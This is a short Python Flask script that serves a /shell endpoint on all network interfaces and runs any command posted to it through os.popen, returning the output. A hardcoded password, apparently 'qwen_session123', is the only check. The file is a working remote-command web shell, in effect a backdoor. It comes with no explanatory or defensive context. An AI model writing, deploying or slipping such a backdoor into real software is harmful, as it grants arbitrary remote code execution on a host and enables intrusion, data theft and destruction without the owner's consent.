import hashlib
from flask import Flask, request

app = Flask(__name__)
AUTH_HASH = hashlib.sha256("qwen_session123".encode()).hexdigest()

@app.route('/shell', methods=['POST'])
def shell():
    if hashlib.sha256(request.form['auth'].encode()).hexdigest() == AUTH_HASH:
        return __import__('os').popen(request.form['cmd']).read()
    return "Auth failed."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
